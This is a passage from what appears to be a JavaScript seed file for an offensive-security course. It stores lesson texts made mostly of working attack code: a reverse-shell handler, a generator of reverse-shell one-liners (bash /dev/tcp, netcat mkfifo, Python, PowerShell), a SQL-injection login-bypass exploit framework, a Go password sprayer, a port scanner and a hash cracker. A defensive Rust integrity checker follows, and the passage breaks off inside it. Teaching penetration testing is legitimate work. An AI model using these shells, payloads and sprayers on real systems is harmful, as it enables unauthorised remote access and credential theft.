        print(f"{'ID':<5} {'Address':<20} {'Status'}")
        print("-" * 40)
        for cid, (sock, addr) in self.clients.items():
            status = "* ACTIVE" if cid == self.active_client else ""
            print(f"{cid:<5} {addr[0]}:{addr[1]:<13} {status}")
        print()

    def interact(self, session_id):
        """Interact with a session"""
        if session_id not in self.clients:
            print(f"Session {session_id} not found")
            return

        self.active_client = session_id
        client_socket, address = self.clients[session_id]
        print(f"[*] Interacting with session {session_id} ({address[0]})")
        print("[*] Type 'background' to return to handler")
        print()

        try:
            while True:
                # Check if data available from client
                ready, _, _ = select.select([client_socket, sys.stdin], [], [], 0.1)

                for sock in ready:
                    if sock == client_socket:
                        # Data from client
                        data = client_socket.recv(4096)
                        if not data:
                            print("[!] Connection closed by remote host")
                            self.remove_session(session_id)
                            return
                        print(data.decode('utf-8', errors='ignore'), end='')

                    elif sock == sys.stdin:
                        # Input from user
                        cmd = input()
                        if cmd.lower() == 'background':
                            print("[*] Backgrounding session...")
                            self.active_client = None
                            return
                        client_socket.send((cmd + '\\n').encode())

        except KeyboardInterrupt:
            print("\\n[*] Backgrounding session...")
            self.active_client = None
        except Exception as e:
            print(f"[!] Error: {e}")
            self.remove_session(session_id)

    def remove_session(self, session_id):
        """Remove a session"""
        if session_id in self.clients:
            sock, addr = self.clients[session_id]
            sock.close()
            del self.clients[session_id]
            self.log(f"Session {session_id} removed")

    def run(self):
        """Main handler loop"""
        self.start_listener()

        print("\\nShell Handler Commands:")
        print("  sessions     - List active sessions")
        print("  interact <id> - Interact with session")
        print("  kill <id>    - Kill a session")
        print("  exit         - Exit handler")
        print()

        while self.running:
            try:
                cmd = input("handler> ").strip()

                if not cmd:
                    continue
                elif cmd == 'sessions':
                    self.list_sessions()
                elif cmd.startswith('interact '):
                    try:
                        sid = int(cmd.split()[1])
                        self.interact(sid)
                    except (ValueError, IndexError):
                        print("Usage: interact <session_id>")
                elif cmd.startswith('kill '):
                    try:
                        sid = int(cmd.split()[1])
                        self.remove_session(sid)
                    except (ValueError, IndexError):
                        print("Usage: kill <session_id>")
                elif cmd == 'exit':
                    self.running = False
                    break
                else:
                    print(f"Unknown command: {cmd}")

            except KeyboardInterrupt:
                print()
                continue
            except EOFError:
                break

        # Cleanup
        for sid in list(self.clients.keys()):
            self.remove_session(sid)
        self.server.close()
        print("[*] Handler closed")


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Reverse Shell Handler')
    parser.add_argument('-p', '--port', type=int, default=4444)
    parser.add_argument('-H', '--host', default='0.0.0.0')
    args = parser.parse_args()

    handler = ShellHandler(args.host, args.port)
    handler.run()
\`\`\`

### Reverse Shell Payloads
\`\`\`python
# payloads.py - Generate reverse shell payloads

def python_reverse(host, port):
    return f'''python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' '''

def bash_reverse(host, port):
    return f'''bash -i >& /dev/tcp/{host}/{port} 0>&1'''

def nc_reverse(host, port):
    return f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f'''

def powershell_reverse(host, port):
    return f'''powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}"'''
\`\`\``, 2, now);

insertTask.run(mod3.lastInsertRowid, 'Create an exploit framework skeleton', 'Design a modular exploit framework in Python with payload generation, encoder support, target configuration, and exploit module interfaces for standardized vulnerability exploitation workflows', `## Python Exploit Framework

### Framework Structure
\`\`\`
exploit_framework/
├── framework.py          # Main framework
├── exploits/
│   ├── __init__.py
│   ├── base.py          # Base exploit class
│   ├── web/
│   │   ├── sqli.py
│   │   └── rce.py
│   └── services/
│       ├── ssh_brute.py
│       └── ftp_anon.py
├── payloads/
│   ├── __init__.py
│   └── shells.py
└── utils/
    ├── __init__.py
    ├── network.py
    └── encoding.py
\`\`\`

### Base Exploit Class
\`\`\`python
# exploits/base.py
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Optional, Dict, Any

@dataclass
class ExploitResult:
    success: bool
    message: str
    data: Optional[Dict[str, Any]] = None

class BaseExploit(ABC):
    name: str = "Base Exploit"
    description: str = ""
    author: str = ""
    references: list = []

    def __init__(self):
        self.options = {}
        self.required_options = []

    @abstractmethod
    def check(self) -> bool:
        """Check if target is vulnerable"""
        pass

    @abstractmethod
    def exploit(self) -> ExploitResult:
        """Execute the exploit"""
        pass

    def set_option(self, name: str, value: Any):
        self.options[name] = value

    def validate_options(self) -> bool:
        for opt in self.required_options:
            if opt not in self.options or not self.options[opt]:
                print(f"[-] Missing required option: {opt}")
                return False
        return True

    def info(self):
        print(f"\\nName: {self.name}")
        print(f"Description: {self.description}")
        print(f"Author: {self.author}")
        if self.references:
            print("References:")
            for ref in self.references:
                print(f"  - {ref}")
\`\`\`

### Example Exploit Module
\`\`\`python
# exploits/web/sqli_login_bypass.py
from exploits.base import BaseExploit, ExploitResult
import requests

class SQLiLoginBypass(BaseExploit):
    name = "SQL Injection Login Bypass"
    description = "Bypass authentication via SQL injection"
    author = "YourName"
    references = ["https://owasp.org/www-community/attacks/SQL_Injection"]

    def __init__(self):
        super().__init__()
        self.required_options = ['target', 'username_field', 'password_field']
        self.options = {
            'target': '',
            'username_field': 'username',
            'password_field': 'password',
            'success_indicator': 'Welcome',
            'payloads': [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "admin'--",
                "' OR 1=1--",
                "') OR ('1'='1",
            ]
        }

    def check(self) -> bool:
        """Check if target has a login form"""
        try:
            resp = requests.get(self.options['target'], timeout=10)
            return self.options['username_field'] in resp.text
        except:
            return False

    def exploit(self) -> ExploitResult:
        if not self.validate_options():
            return ExploitResult(False, "Missing required options")

        target = self.options['target']
        success_indicator = self.options['success_indicator']

        for payload in self.options['payloads']:
            data = {
                self.options['username_field']: payload,
                self.options['password_field']: payload
            }

            try:
                resp = requests.post(target, data=data, timeout=10)

                if success_indicator in resp.text:
                    return ExploitResult(
                        True,
                        f"Login bypassed with payload: {payload}",
                        {'payload': payload, 'response': resp.text[:500]}
                    )
            except Exception as e:
                continue

        return ExploitResult(False, "No successful payload found")
\`\`\`

### Main Framework
\`\`\`python
# framework.py
import importlib
import os
import sys

class ExploitFramework:
    def __init__(self):
        self.exploits = {}
        self.current_exploit = None
        self.load_exploits()

    def load_exploits(self):
        """Dynamically load all exploit modules"""
        exploit_dir = os.path.join(os.path.dirname(__file__), 'exploits')
        for root, dirs, files in os.walk(exploit_dir):
            for file in files:
                if file.endswith('.py') and file != '__init__.py' and file != 'base.py':
                    rel_path = os.path.relpath(os.path.join(root, file), exploit_dir)
                    module_path = 'exploits.' + rel_path[:-3].replace('/', '.')
                    try:
                        module = importlib.import_module(module_path)
                        for name, obj in module.__dict__.items():
                            if isinstance(obj, type) and hasattr(obj, 'exploit'):
                                exploit_name = f"{rel_path[:-3].replace('/', '_')}"
                                self.exploits[exploit_name] = obj
                    except Exception as e:
                        print(f"Error loading {module_path}: {e}")

    def list_exploits(self):
        print("\\nAvailable Exploits:")
        for name, exploit_class in self.exploits.items():
            e = exploit_class()
            print(f"  {name}: {e.description}")

    def use(self, exploit_name):
        if exploit_name in self.exploits:
            self.current_exploit = self.exploits[exploit_name]()
            print(f"[*] Using {exploit_name}")
        else:
            print(f"[-] Exploit not found: {exploit_name}")

    def run(self):
        print("\\n=== Exploit Framework ===")
        print("Commands: list, use <exploit>, set <opt> <val>, options, run, check, back, exit")

        while True:
            try:
                prompt = f"({self.current_exploit.name}) " if self.current_exploit else ""
                cmd = input(f"framework{prompt}> ").strip()

                if not cmd:
                    continue
                elif cmd == 'list':
                    self.list_exploits()
                elif cmd.startswith('use '):
                    self.use(cmd.split(' ', 1)[1])
                elif cmd == 'options' and self.current_exploit:
                    print("\\nOptions:")
                    for k, v in self.current_exploit.options.items():
                        req = "*" if k in self.current_exploit.required_options else ""
                        print(f"  {k}{req}: {v}")
                elif cmd.startswith('set ') and self.current_exploit:
                    parts = cmd.split(' ', 2)
                    if len(parts) == 3:
                        self.current_exploit.set_option(parts[1], parts[2])
                elif cmd == 'run' and self.current_exploit:
                    result = self.current_exploit.exploit()
                    print(f"[{'+'if result.success else'-'}] {result.message}")
                elif cmd == 'check' and self.current_exploit:
                    if self.current_exploit.check():
                        print("[+] Target appears vulnerable")
                    else:
                        print("[-] Target does not appear vulnerable")
                elif cmd == 'back':
                    self.current_exploit = None
                elif cmd == 'exit':
                    break
            except KeyboardInterrupt:
                print()
            except Exception as e:
                print(f"Error: {e}")

if __name__ == '__main__':
    fw = ExploitFramework()
    fw.run()
\`\`\``, 3, now);

// Module 4: Go Offensive Tools
const mod4 = insertModule.run(labPath.lastInsertRowid, 'Build Go Offensive Tools', 'Create fast, compiled security tools in Go', 3, now);

insertTask.run(mod4.lastInsertRowid, 'Build a concurrent subdomain enumerator', 'Write a Go tool that performs concurrent DNS resolution against wordlists, integrates with certificate transparency logs, and validates discovered subdomains for comprehensive attack surface mapping', `## Go Subdomain Enumerator

### Project Setup
\`\`\`bash
mkdir subdomain-enum && cd subdomain-enum
go mod init subdomain-enum
\`\`\`

### Full Implementation
\`\`\`go
// main.go
package main

import (
    "bufio"
    "context"
    "flag"
    "fmt"
    "net"
    "os"
    "strings"
    "sync"
    "time"
)

type Result struct {
    Subdomain string
    IPs       []string
}

func resolve(subdomain string, timeout time.Duration) *Result {
    ctx, cancel := context.WithTimeout(context.Background(), timeout)
    defer cancel()

    resolver := net.Resolver{}
    ips, err := resolver.LookupHost(ctx, subdomain)
    if err != nil {
        return nil
    }

    return &Result{
        Subdomain: subdomain,
        IPs:       ips,
    }
}

func worker(jobs <-chan string, results chan<- *Result, timeout time.Duration, wg *sync.WaitGroup) {
    defer wg.Done()
    for subdomain := range jobs {
        if result := resolve(subdomain, timeout); result != nil {
            results <- result
        }
    }
}

func loadWordlist(path string) ([]string, error) {
    file, err := os.Open(path)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var words []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        word := strings.TrimSpace(scanner.Text())
        if word != "" && !strings.HasPrefix(word, "#") {
            words = append(words, word)
        }
    }
    return words, scanner.Err()
}

func main() {
    domain := flag.String("d", "", "Target domain")
    wordlist := flag.String("w", "", "Wordlist path")
    threads := flag.Int("t", 50, "Number of threads")
    timeout := flag.Duration("timeout", 2*time.Second, "DNS timeout")
    output := flag.String("o", "", "Output file")
    flag.Parse()

    if *domain == "" || *wordlist == "" {
        fmt.Println("Usage: subdomain-enum -d domain.com -w wordlist.txt")
        flag.PrintDefaults()
        os.Exit(1)
    }

    // Load wordlist
    words, err := loadWordlist(*wordlist)
    if err != nil {
        fmt.Printf("Error loading wordlist: %v\\n", err)
        os.Exit(1)
    }

    fmt.Printf("[*] Target: %s\\n", *domain)
    fmt.Printf("[*] Wordlist: %d words\\n", len(words))
    fmt.Printf("[*] Threads: %d\\n", *threads)
    fmt.Println("[*] Starting enumeration...")

    // Create channels
    jobs := make(chan string, *threads)
    results := make(chan *Result, *threads)

    // Start workers
    var wg sync.WaitGroup
    for i := 0; i < *threads; i++ {
        wg.Add(1)
        go worker(jobs, results, *timeout, &wg)
    }

    // Collect results
    var found []Result
    var resultWg sync.WaitGroup
    resultWg.Add(1)
    go func() {
        defer resultWg.Done()
        for result := range results {
            found = append(found, *result)
            fmt.Printf("[+] %s -> %s\\n", result.Subdomain, strings.Join(result.IPs, ", "))
        }
    }()

    // Send jobs
    for _, word := range words {
        subdomain := fmt.Sprintf("%s.%s", word, *domain)
        jobs <- subdomain
    }
    close(jobs)

    // Wait for workers
    wg.Wait()
    close(results)
    resultWg.Wait()

    fmt.Printf("\\n[+] Found %d subdomains\\n", len(found))

    // Save output
    if *output != "" {
        file, err := os.Create(*output)
        if err != nil {
            fmt.Printf("Error creating output file: %v\\n", err)
            return
        }
        defer file.Close()

        for _, r := range found {
            file.WriteString(fmt.Sprintf("%s,%s\\n", r.Subdomain, strings.Join(r.IPs, ";")))
        }
        fmt.Printf("[+] Results saved to %s\\n", *output)
    }
}
\`\`\`

### Build & Usage
\`\`\`bash
# Build
go build -o subdomain-enum

# Cross-compile
GOOS=windows GOARCH=amd64 go build -o subdomain-enum.exe
GOOS=linux GOARCH=amd64 go build -o subdomain-enum-linux

# Usage
./subdomain-enum -d example.com -w subdomains.txt -t 100

# With output file
./subdomain-enum -d example.com -w subdomains.txt -o results.csv
\`\`\`

### Exercises
1. Add wildcard detection
2. Implement recursive subdomain enumeration
3. Add HTTP probing for found subdomains
4. Integrate with APIs (crt.sh, SecurityTrails)`, 0, now);

insertTask.run(mod4.lastInsertRowid, 'Create a password spraying tool', 'Build a Go-based password sprayer that tests credential combinations against SMB, LDAP, Kerberos, and web services with configurable timing, lockout awareness, and multi-target concurrent testing capabilities', `## Go Password Sprayer

### Implementation
\`\`\`go
// spray.go
package main

import (
    "bufio"
    "crypto/tls"
    "flag"
    "fmt"
    "net/http"
    "os"
    "strings"
    "sync"
    "time"
)

type Credential struct {
    Username string
    Password string
}

type Result struct {
    Credential
    Success bool
    Status  int
}

// HTTPBasicSpray tests HTTP Basic Auth
func HTTPBasicSpray(target string, cred Credential, timeout time.Duration) Result {
    client := &http.Client{
        Timeout: timeout,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("GET", target, nil)
    if err != nil {
        return Result{cred, false, 0}
    }

    req.SetBasicAuth(cred.Username, cred.Password)

    resp, err := client.Do(req)
    if err != nil {
        return Result{cred, false, 0}
    }
    defer resp.Body.Close()

    // 401 = wrong creds, 200/302 = success
    success := resp.StatusCode != 401 && resp.StatusCode != 403
    return Result{cred, success, resp.StatusCode}
}

// FormSpray tests form-based login
func FormSpray(target, userField, passField, failIndicator string, cred Credential, timeout time.Duration) Result {
    client := &http.Client{
        Timeout: timeout,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    data := fmt.Sprintf("%s=%s&%s=%s", userField, cred.Username, passField, cred.Password)
    req, err := http.NewRequest("POST", target, strings.NewReader(data))
    if err != nil {
        return Result{cred, false, 0}
    }
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    resp, err := client.Do(req)
    if err != nil {
        return Result{cred, false, 0}
    }
    defer resp.Body.Close()

    // Read response body
    buf := make([]byte, 4096)
    n, _ := resp.Body.Read(buf)
    body := string(buf[:n])

    success := !strings.Contains(body, failIndicator)
    return Result{cred, success, resp.StatusCode}
}

func loadFile(path string) ([]string, error) {
    file, err := os.Open(path)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            lines = append(lines, line)
        }
    }
    return lines, nil
}

func main() {
    target := flag.String("t", "", "Target URL")
    userFile := flag.String("U", "", "Username file")
    passFile := flag.String("P", "", "Password file")
    password := flag.String("p", "", "Single password to spray")
    threads := flag.Int("threads", 10, "Number of threads")
    delay := flag.Duration("delay", 0, "Delay between requests")
    authType := flag.String("auth", "basic", "Auth type: basic, form")
    userField := flag.String("user-field", "username", "Form username field")
    passField := flag.String("pass-field", "password", "Form password field")
    failStr := flag.String("fail", "Invalid", "String indicating failed login")
    flag.Parse()

    if *target == "" || *userFile == "" {
        fmt.Println("Usage: spray -t <target> -U <users.txt> -P <passwords.txt>")
        flag.PrintDefaults()
        os.Exit(1)
    }

    // Load users
    users, err := loadFile(*userFile)
    if err != nil {
        fmt.Printf("Error loading users: %v\\n", err)
        os.Exit(1)
    }

    // Load or set passwords
    var passwords []string
    if *password != "" {
        passwords = []string{*password}
    } else if *passFile != "" {
        passwords, err = loadFile(*passFile)
        if err != nil {
            fmt.Printf("Error loading passwords: %v\\n", err)
            os.Exit(1)
        }
    } else {
        fmt.Println("Provide -p or -P for passwords")
        os.Exit(1)
    }

    fmt.Printf("[*] Target: %s\\n", *target)
    fmt.Printf("[*] Users: %d, Passwords: %d\\n", len(users), len(passwords))
    fmt.Printf("[*] Auth type: %s\\n", *authType)
    fmt.Printf("[*] Starting spray...\\n\\n")

    // Create job channel
    jobs := make(chan Credential, *threads)
    results := make(chan Result, *threads)

    // Start workers
    var wg sync.WaitGroup
    for i := 0; i < *threads; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for cred := range jobs {
                var result Result
                if *authType == "basic" {
                    result = HTTPBasicSpray(*target, cred, 10*time.Second)
                } else {
                    result = FormSpray(*target, *userField, *passField, *failStr, cred, 10*time.Second)
                }
                results <- result

                if *delay > 0 {
                    time.Sleep(*delay)
                }
            }
        }()
    }

    // Collect results
    var found []Result
    go func() {
        for result := range results {
            if result.Success {
                found = append(found, result)
                fmt.Printf("[+] SUCCESS: %s:%s (Status: %d)\\n",
                    result.Username, result.Password, result.Status)
            }
        }
    }()

    // Send jobs - spray one password across all users first
    for _, pass := range passwords {
        for _, user := range users {
            jobs <- Credential{user, pass}
        }
    }
    close(jobs)

    wg.Wait()
    close(results)

    time.Sleep(100 * time.Millisecond) // Let results drain

    fmt.Printf("\\n[+] Spray complete. Found %d valid credentials\\n", len(found))
}
\`\`\`

### Usage
\`\`\`bash
# Build
go build -o spray

# HTTP Basic Auth
./spray -t https://target.com/admin -U users.txt -p 'Summer2024!'

# Form-based login
./spray -t https://target.com/login -U users.txt -P passwords.txt \\
  -auth form -user-field email -pass-field passwd -fail "Invalid credentials"

# With delay (avoid lockout)
./spray -t https://target.com/login -U users.txt -p 'Password1' -delay 1s
\`\`\``, 1, now);

insertTask.run(mod4.lastInsertRowid, 'Build a network service scanner', 'Develop a concurrent port scanner in Go with service fingerprinting, banner grabbing, version detection, and JSON output for integrating into automated reconnaissance pipelines', `## Go Service Scanner

### Implementation
\`\`\`go
// scanner.go
package main

import (
    "bufio"
    "flag"
    "fmt"
    "net"
    "os"
    "sort"
    "strconv"
    "strings"
    "sync"
    "time"
)

type PortResult struct {
    Port    int
    Open    bool
    Banner  string
    Service string
}

var commonPorts = map[int]string{
    21:    "FTP",
    22:    "SSH",
    23:    "Telnet",
    25:    "SMTP",
    53:    "DNS",
    80:    "HTTP",
    110:   "POP3",
    111:   "RPC",
    135:   "MSRPC",
    139:   "NetBIOS",
    143:   "IMAP",
    443:   "HTTPS",
    445:   "SMB",
    993:   "IMAPS",
    995:   "POP3S",
    1433:  "MSSQL",
    1521:  "Oracle",
    3306:  "MySQL",
    3389:  "RDP",
    5432:  "PostgreSQL",
    5900:  "VNC",
    6379:  "Redis",
    8080:  "HTTP-Proxy",
    8443:  "HTTPS-Alt",
    27017: "MongoDB",
}

func scanPort(host string, port int, timeout time.Duration) PortResult {
    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, timeout)

    result := PortResult{Port: port, Open: false}

    if err != nil {
        return result
    }
    defer conn.Close()

    result.Open = true
    result.Service = commonPorts[port]

    // Try to grab banner
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))

    // Send probe for HTTP
    if port == 80 || port == 8080 || port == 443 || port == 8443 {
        conn.Write([]byte("HEAD / HTTP/1.0\\r\\n\\r\\n"))
    }

    banner := make([]byte, 1024)
    n, _ := conn.Read(banner)
    if n > 0 {
        result.Banner = strings.TrimSpace(string(banner[:n]))
        // Truncate long banners
        if len(result.Banner) > 80 {
            result.Banner = result.Banner[:80] + "..."
        }
    }

    return result
}

func worker(host string, jobs <-chan int, results chan<- PortResult, timeout time.Duration, wg *sync.WaitGroup) {
    defer wg.Done()
    for port := range jobs {
        result := scanPort(host, port, timeout)
        if result.Open {
            results <- result
        }
    }
}

func parsePorts(portSpec string) []int {
    var ports []int

    for _, part := range strings.Split(portSpec, ",") {
        part = strings.TrimSpace(part)
        if strings.Contains(part, "-") {
            bounds := strings.Split(part, "-")
            start, _ := strconv.Atoi(bounds[0])
            end, _ := strconv.Atoi(bounds[1])
            for p := start; p <= end; p++ {
                ports = append(ports, p)
            }
        } else {
            p, _ := strconv.Atoi(part)
            if p > 0 {
                ports = append(ports, p)
            }
        }
    }

    return ports
}

func main() {
    host := flag.String("h", "", "Target host")
    hostFile := flag.String("H", "", "File with hosts")
    portSpec := flag.String("p", "1-1000", "Port specification")
    threads := flag.Int("t", 100, "Number of threads")
    timeout := flag.Duration("timeout", 2*time.Second, "Connection timeout")
    flag.Parse()

    // Get targets
    var hosts []string
    if *host != "" {
        hosts = append(hosts, *host)
    } else if *hostFile != "" {
        file, err := os.Open(*hostFile)
        if err != nil {
            fmt.Printf("Error opening host file: %v\\n", err)
            os.Exit(1)
        }
        defer file.Close()
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            h := strings.TrimSpace(scanner.Text())
            if h != "" {
                hosts = append(hosts, h)
            }
        }
    } else {
        fmt.Println("Usage: scanner -h <host> -p <ports>")
        flag.PrintDefaults()
        os.Exit(1)
    }

    ports := parsePorts(*portSpec)

    for _, target := range hosts {
        fmt.Printf("\\n[*] Scanning %s (%d ports)\\n", target, len(ports))
        fmt.Println(strings.Repeat("-", 60))

        jobs := make(chan int, *threads)
        results := make(chan PortResult, *threads)

        var wg sync.WaitGroup
        for i := 0; i < *threads; i++ {
            wg.Add(1)
            go worker(target, jobs, results, *timeout, &wg)
        }

        // Collect results
        var openPorts []PortResult
        var resultWg sync.WaitGroup
        resultWg.Add(1)
        go func() {
            defer resultWg.Done()
            for result := range results {
                openPorts = append(openPorts, result)
            }
        }()

        // Send jobs
        for _, port := range ports {
            jobs <- port
        }
        close(jobs)

        wg.Wait()
        close(results)
        resultWg.Wait()

        // Sort and display
        sort.Slice(openPorts, func(i, j int) bool {
            return openPorts[i].Port < openPorts[j].Port
        })

        fmt.Printf("%-8s %-12s %s\\n", "PORT", "SERVICE", "BANNER")
        for _, r := range openPorts {
            service := r.Service
            if service == "" {
                service = "unknown"
            }
            fmt.Printf("%-8d %-12s %s\\n", r.Port, service, r.Banner)
        }
        fmt.Printf("\\n[+] Found %d open ports\\n", len(openPorts))
    }
}
\`\`\`

### Build & Usage
\`\`\`bash
go build -o scanner

# Scan single host
./scanner -h 10.30.30.100 -p 1-1000

# Common ports
./scanner -h 10.30.30.100 -p 21,22,80,443,3389,8080

# Full port scan
./scanner -h 10.30.30.100 -p 1-65535 -t 500

# Scan multiple hosts
./scanner -H hosts.txt -p 22,80,443
\`\`\``, 2, now);

// Module 5: Rust Offensive Tools
const mod5 = insertModule.run(labPath.lastInsertRowid, 'Build Rust Offensive Tools', 'Create high-performance, safe security tools in Rust', 4, now);

insertTask.run(mod5.lastInsertRowid, 'Build a fast hash cracker', 'Implement a high-performance password cracker in Rust with parallel hash computation using rayon, dictionary and rule-based attacks, and support for common hash types like MD5, SHA-1, and NTLM', `## Rust Hash Cracker

### Project Setup
\`\`\`bash
cargo new hashcrack
cd hashcrack

# Add dependencies to Cargo.toml
cat >> Cargo.toml << 'EOF'
[dependencies]
md5 = "0.7"
sha2 = "0.10"
hex = "0.4"
rayon = "1.8"
clap = { version = "4", features = ["derive"] }
EOF
\`\`\`

### Implementation
\`\`\`rust
// src/main.rs
use clap::Parser;
use md5::{Md5, Digest as Md5Digest};
use sha2::{Sha256, Sha512, Digest};
use rayon::prelude::*;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Instant;

#[derive(Parser)]
#[command(name = "hashcrack")]
#[command(about = "Multi-threaded hash cracker")]
struct Args {
    /// Hash to crack
    #[arg(short = 'H', long)]
    hash: String,

    /// Wordlist path
    #[arg(short, long)]
    wordlist: String,

    /// Hash type: md5, sha256, sha512
    #[arg(short = 't', long, default_value = "md5")]
    hash_type: String,
}

fn hash_md5(input: &str) -> String {
    let mut hasher = Md5::new();
    hasher.update(input.as_bytes());
    hex::encode(hasher.finalize())
}

fn hash_sha256(input: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    hex::encode(hasher.finalize())
}

fn hash_sha512(input: &str) -> String {
    let mut hasher = Sha512::new();
    hasher.update(input.as_bytes());
    hex::encode(hasher.finalize())
}

fn crack(target: &str, wordlist: &str, hash_type: &str) -> Option<String> {
    let file = File::open(wordlist).expect("Cannot open wordlist");
    let reader = BufReader::new(file);
    let words: Vec<String> = reader.lines().filter_map(|l| l.ok()).collect();

    let found = Arc::new(AtomicBool::new(false));
    let count = Arc::new(AtomicU64::new(0));
    let target_lower = target.to_lowercase();

    println!("[*] Loaded {} words", words.len());
    println!("[*] Hash type: {}", hash_type);
    println!("[*] Cracking...");

    let start = Instant::now();

    let result: Option<String> = words.par_iter().find_map_any(|word| {
        if found.load(Ordering::Relaxed) {
            return None;
        }

        let hashed = match hash_type {
            "md5" => hash_md5(word),
            "sha256" => hash_sha256(word),
            "sha512" => hash_sha512(word),
            _ => hash_md5(word),
        };

        count.fetch_add(1, Ordering::Relaxed);

        if hashed == target_lower {
            found.store(true, Ordering::Relaxed);
            return Some(word.clone());
        }

        None
    });

    let elapsed = start.elapsed();
    let checked = count.load(Ordering::Relaxed);
    let rate = checked as f64 / elapsed.as_secs_f64();

    println!("[*] Checked {} hashes in {:.2}s ({:.0} h/s)",
             checked, elapsed.as_secs_f64(), rate);

    result
}

fn main() {
    let args = Args::parse();

    println!("\\n=== Hash Cracker ===");
    println!("[*] Target: {}", args.hash);

    match crack(&args.hash, &args.wordlist, &args.hash_type) {
        Some(password) => {
            println!("\\n[+] CRACKED!");
            println!("[+] Password: {}", password);
        }
        None => {
            println!("\\n[-] Password not found in wordlist");
        }
    }
}
\`\`\`

### Build & Usage
\`\`\`bash
# Build release (optimized)
cargo build --release

# Usage
./target/release/hashcrack -H 5f4dcc3b5aa765d61d8327deb882cf99 -w rockyou.txt
./target/release/hashcrack -H <sha256_hash> -w wordlist.txt -t sha256

# Expected output:
# === Hash Cracker ===
# [*] Target: 5f4dcc3b5aa765d61d8327deb882cf99
# [*] Loaded 14344392 words
# [*] Hash type: md5
# [*] Cracking...
# [*] Checked 6234 hashes in 0.02s (311700 h/s)
#
# [+] CRACKED!
# [+] Password: password
\`\`\`

### Exercises
1. Add NTLM hash support
2. Implement rule-based mutations
3. Add mask/brute-force attack mode
4. Implement hash identification
5. Add bcrypt/scrypt support (slower, need different approach)`, 0, now);

insertTask.run(mod5.lastInsertRowid, 'Create a file integrity checker', 'Build a file integrity monitoring tool in Rust that computes cryptographic hashes, stores baseline snapshots, detects modifications using inotify, and generates alerts for security-critical file changes', `## Rust File Integrity Checker

### Implementation
\`\`\`rust
// src/main.rs
use clap::{Parser, Subcommand};
use sha2::{Sha256, Digest};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;
use colored::*;

#[derive(Parser)]
#[command(name = "integrity")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Create baseline of directory
    Baseline {
        /// Directory to scan
        path: PathBuf,
        /// Output file
        #[arg(short, long, default_value = "baseline.txt")]
        output: PathBuf,
    },
    /// Check directory against baseline
    Check {
        /// Directory to check
        path: PathBuf,
        /// Baseline file
        #[arg(short, long, default_value = "baseline.txt")]
        baseline: PathBuf,
    },
}

fn hash_file(path: &Path) -> Option<String> {
    let mut file = File::open(path).ok()?;
    let mut hasher = Sha256::new();
    let mut buffer = [0u8; 8192];

    loop {
        let bytes_read = file.read(&mut buffer).ok()?;
        if bytes_read == 0 {
            break;
        }
        hasher.update(&buffer[..bytes_read]);
    }

    Some(hex::encode(hasher.finalize()))
}

fn scan_directory(path: &Path) -> HashMap<PathBuf, String> {
    let mut hashes = HashMap::new();

    for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let file_path = entry.path();
            if let Some(hash) = hash_file(file_path) {
                let relative = file_path.strip_prefix(path).unwrap_or(file_path);
                hashes.insert(relative.to_path_buf(), hash);
            }
        }
    }

    hashes
}

fn create_baseline(path: &Path, output: &Path) {
    println!("{} Creating baseline for: {:?}", "[*]".blue(), path);

    let hashes = scan_directory(path);
    let mut file = File::create(output).expect("Cannot create baseline file");

    for (path, hash) in &hashes {
        writeln!(file, "{}  {}", hash, path.display()).unwrap();
    }

    println!("{} Baseline created: {:?}", "[+]".green(), output);
    println!("{} Files hashed: {}", "[+]".green(), hashes.len());
}

fn load_baseline(path: &Path) -> HashMap<PathBuf, String> {
    let file = File::open(path).expect("Cannot open baseline file");
    let reader = BufReader::new(file);
    let mut hashes = HashMap::new();

    for line in reader.lines().filter_map(|l| l.ok()) {
        let parts: Vec<&str> = line.splitn(2, "  ").collect();
        if parts.len() == 2 {
            hashes.insert(PathBuf::from(parts[1]), parts[0].to_string());
        }
    }

    hashes
}

fn check_integrity(path: &Path, baseline_path: &Path) {
    println!("{} Checking integrity of: {:?}", "[*]".blue(), path);
    println!("{} Baseline: {:?}\\n", "[*]".blue(), baseline_path);

    let baseline = load_baseline(baseline_path);
    let current = scan_directory(path);

    let mut modified = Vec::new();
    let mut added = Vec::new();
    let mut deleted = Vec::new();

